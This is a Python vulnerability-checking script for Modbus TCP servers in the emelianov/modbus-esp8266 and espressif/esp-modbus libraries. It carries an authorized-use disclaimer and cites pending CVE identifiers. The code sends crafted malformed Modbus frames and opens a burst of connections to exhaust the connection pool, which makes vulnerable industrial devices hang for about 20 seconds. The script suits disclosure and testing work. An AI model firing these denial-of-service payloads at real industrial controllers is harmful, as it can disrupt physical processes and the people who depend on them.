#!/usr/bin/env python3
"""
Modbus TCP DoS Checker — public release tool
Checks a Modbus TCP target for six known problematic behaviors (hangs / connection
exhaustion) across two Modbus server libraries. Disclosure status per check:

  emelianov/modbus-esp8266: bare function code hang        — CVE pending (CAN-2026-2033697)
  espressif/esp-modbus:     UID range 0xF8-0xFF hang       — Espressif assessed as robustness, not a vuln (no CVE)
  proto ID != 0x0000 hang      — emelianov: CVE pending (CAN-2026-2033701); Espressif: robustness, no CVE
  MBAP length starvation hang  — Espressif assessed as robustness, not a vuln (no CVE)
  MBAP length=1 / no FC byte   — emelianov: CVE pending (CAN-2026-2033702); Espressif: robustness, no CVE
  TCP connection pool exhaust  — Espressif assessed as robustness, not a vuln (no CVE)

Note: Espressif reviewed all five esp-modbus behaviors (bug-bounty BBP#582) and classified
them as robustness / implementation details rather than vulnerabilities. They are still worth
checking for, but no CVE will be assigned for them.

Usage:
  python3 modbus_tcp_dos_check.py --target 192.168.1.100
  python3 modbus_tcp_dos_check.py --target 192.168.1.100 --safe-only
  python3 modbus_tcp_dos_check.py --target 192.168.1.100 --output json

Exit: 0 = no findings, 1 = one or more findings confirmed

Discovered by alosafuzz using icsFuzzer (https://github.com/alosafuzz/icsFuzzer)
"""

import argparse
import json
import socket
import struct
import sys
import time

_DISCLAIMER = """
AUTHORIZED USE ONLY. This tool checks for known vulnerabilities in Modbus TCP
server implementations. Use only against devices you own or have explicit written
permission to test. Unauthorized use may violate the Computer Fraud and Abuse Act
and similar laws.

The pool-exhaust check (Finding 6) opens multiple TCP connections rapidly and will
cause brief service disruption. Use --safe-only to skip it.
"""

_TIMEOUT = 5.0
_VALID_PDU = struct.pack(">BHH", 0x03, 0x0000, 0x0001)

# Disclosure reference per check. emelianov CVEs pending (CANs reserved); Espressif
# reviewed and declined its five behaviors as robustness (BBP#582) — no CVE for those.
_REFS = {
    "bare_fc":        "emelianov: CVE pending, CAN-2026-2033697",
    "uid_range":      "espressif: robustness, no CVE",
    "proto_id":       "emelianov: CVE pending, CAN-2026-2033701 | espressif: robustness, no CVE",
    "length_starve":  "espressif: robustness, no CVE",
    "zero_pdu":       "emelianov: CVE pending, CAN-2026-2033702 | espressif: robustness, no CVE",
    "pool_exhaust":   "espressif: robustness, no CVE",
}

_FINDINGS = {
    "bare_fc":       "emelianov/modbus-esp8266: bare FC hang",
    "uid_range":     "esp-modbus: UID 0xF8-0xFF hang",
    "proto_id":      "esp-modbus: proto ID != 0 → 20s DoS",
    "length_starve": "esp-modbus: MBAP length starvation → 20s DoS",
    "zero_pdu":      "esp-modbus: MBAP length=1, no FC → 20s DoS",
    "pool_exhaust":  "esp-modbus: connection pool exhaustion DoS",
}


def _mbap(pdu: bytes, uid: int = 0x01, tid: int = 0x0001) -> bytes:
    return struct.pack(">HHHB", tid, 0x0000, 1 + len(pdu), uid) + pdu


def _mbap_raw(tid: int, proto: int, length: int, uid: int, pdu: bytes) -> bytes:
    return struct.pack(">HHHB", tid, proto, length, uid) + pdu


def _close(s):
    try:
        s.close()
    except Exception:
        pass


def _alive(host: str, port: int) -> bool:
    """Returns True if device responds to a valid FC03."""
    s = None
    try:
        s = socket.socket()
        s.settimeout(_TIMEOUT)
        s.connect((host, port))
        s.sendall(_mbap(_VALID_PDU))
        s.recv(256)
        _close(s)
        return True
    except Exception:
        _close(s)
        return False


def _check_bare_fc(host: str, port: int, quiet: bool) -> bool:
    s = None
    try:
        s = socket.socket()
        s.settimeout(_TIMEOUT)
        s.connect((host, port))
        s.sendall(_mbap(b"\x03"))  # bare FC03, no PDU
        resp = s.recv(256)
        _close(s)
        # Exception response = correct behaviour
        if len(resp) >= 8 and resp[7] & 0x80:
            return False
        return False
    except socket.timeout:
        # Confirm hang persists on same connection
        try:
            s.sendall(_mbap(_VALID_PDU))
            s.recv(256)
            _close(s)
            return False  # recovered — not hung
        except socket.timeout:
            _close(s)
            return True
        except Exception:
            _close(s)
            return True
    except Exception:
        _close(s)
        return False


def _check_uid_range(host: str, port: int, quiet: bool) -> bool:
    s = None
    try:
        s = socket.socket()
        s.settimeout(_TIMEOUT)
        s.connect((host, port))
        s.sendall(_mbap(_VALID_PDU, uid=0xFF))
        s.recv(256)
        _close(s)
        return False
    except socket.timeout:
        _close(s)
        time.sleep(1)
        return True  # hung on uid=0xFF
    except Exception:
        _close(s)
        return False


def _check_proto_id(host: str, port: int, quiet: bool) -> bool:
    s = None
    try:
        s = socket.socket()
        s.settimeout(_TIMEOUT)
        s.connect((host, port))
        s.sendall(_mbap_raw(0x0001, 0x0001, 1 + len(_VALID_PDU), 0x01, _VALID_PDU))
        s.recv(256)
        _close(s)
        return False
    except socket.timeout:
        _close(s)
        time.sleep(1)
        return True
    except Exception:
        _close(s)
        return False


def _check_length_starve(host: str, port: int, quiet: bool) -> bool:
    s = None
    try:
        s = socket.socket()
        s.settimeout(_TIMEOUT)
        s.connect((host, port))
        s.sendall(_mbap_raw(0x0001, 0x0000, 0xFF, 0x01, _VALID_PDU))
        s.recv(256)
        _close(s)
        return False
    except socket.timeout:
        _close(s)
        time.sleep(1)
        return True
    except Exception:
        _close(s)
        return False


def _check_zero_pdu(host: str, port: int, quiet: bool) -> bool:
    s = None
    try:
        s = socket.socket()
        s.settimeout(_TIMEOUT)
        s.connect((host, port))
        s.sendall(_mbap_raw(0x0001, 0x0000, 0x01, 0x01, b""))
        s.recv(256)
        _close(s)
        return False
    except socket.timeout:
        _close(s)
        time.sleep(1)
        return True
    except Exception:
        _close(s)
        return False


def _check_pool_exhaust(host: str, port: int, quiet: bool) -> bool:
    first_reset = None
    for i in range(7):
        s = None
        try:
            s = socket.socket()
            s.settimeout(3.0)
            s.connect((host, port))
            s.sendall(_mbap(_VALID_PDU, tid=i + 1))
            s.recv(256)
            _close(s)
        except ConnectionResetError:
            _close(s)
            if first_reset is None:
                first_reset = i + 1
        except Exception:
            _close(s)
    return first_reset is not None


_CHECKS = [
    ("bare_fc",       _check_bare_fc,       False),  # (key, fn, disruptive)
    ("uid_range",     _check_uid_range,     False),
    ("proto_id",      _check_proto_id,      False),
    ("length_starve", _check_length_starve, False),
    ("zero_pdu",      _check_zero_pdu,      False),
    ("pool_exhaust",  _check_pool_exhaust,  True),   # causes brief service disruption
]


def run_all(host: str, port: int, safe_only: bool, quiet: bool) -> dict:
    results = {}

    for key, fn, disruptive in _CHECKS:
        if safe_only and disruptive:
            results[key] = None  # skipped
            continue

        if not quiet:
            label = _FINDINGS[key]
            print(f"  Checking {label}...", end="", flush=True)

        # Wait for device to recover between checks that cause hangs
        if key in ("uid_range", "proto_id", "length_starve", "zero_pdu"):
            # Previous check may have left the device in a DoS window; wait for it
            waited = 0
            while waited < 22 and not _alive(host, port):
                time.sleep(2)
                waited += 2

        vulnerable = fn(host, port, quiet)
        results[key] = vulnerable

        if not quiet:
            status = "VULNERABLE" if vulnerable else "ok"
            if results[key] is None:
                status = "SKIPPED"
            ref = _REFS[key]
            print(f"  {status}  ({ref})")

    return results


def main() -> None:
    print(_DISCLAIMER)

    ap = argparse.ArgumentParser(
        description="Modbus TCP DoS checker — emelianov/modbus-esp8266 + espressif/esp-modbus"
    )
    ap.add_argument("--target", required=True, metavar="IP")
    ap.add_argument("--port", type=int, default=502, metavar="PORT")
    ap.add_argument(
        "--safe-only",
        action="store_true",
        help="Skip pool-exhaust check (Finding 6) — avoids service disruption",
    )
    ap.add_argument(
        "--output",
        choices=["text", "json"],
        default="text",
        metavar="FORMAT",
    )
    args = ap.parse_args()

    quiet = args.output == "json"

    if not quiet:
        print(f"[*] Target: {args.target}:{args.port}")
        if args.safe_only:
            print("[*] Safe-only mode: pool-exhaust check skipped")
        print()

        if not _alive(args.target, args.port):
            print("[-] Target not responding to valid FC03. Check IP/port.")
            sys.exit(2)
        print()

    results = run_all(args.target, args.port, args.safe_only, quiet)

    confirmed = [k for k, v in results.items() if v is True]
    skipped   = [k for k, v in results.items() if v is None]

    if args.output == "json":
        out = {
            "target": f"{args.target}:{args.port}",
            "findings": {k: v for k, v in results.items()},
            "references": _REFS,
            "summary": {
                "confirmed": len(confirmed),
                "clean":     len([v for v in results.values() if v is False]),
                "skipped":   len(skipped),
            },
        }
        print(json.dumps(out, indent=2))
    else:
        print()
        if confirmed:
            print(f"Summary: {len(confirmed)}/{len(_CHECKS) - len(skipped)} findings confirmed"
                  + (f" ({len(skipped)} skipped)" if skipped else ""))
            for k in confirmed:
                print(f"  [!] {_FINDINGS[k]}  ({_REFS[k]})")
        else:
            print(f"Summary: 0/{len(_CHECKS) - len(skipped)} findings confirmed"
                  + (f" ({len(skipped)} skipped)" if skipped else ""))
            print("  Target appears not vulnerable (or not an affected implementation).")

    sys.exit(1 if confirmed else 0)


if __name__ == "__main__":
    main()
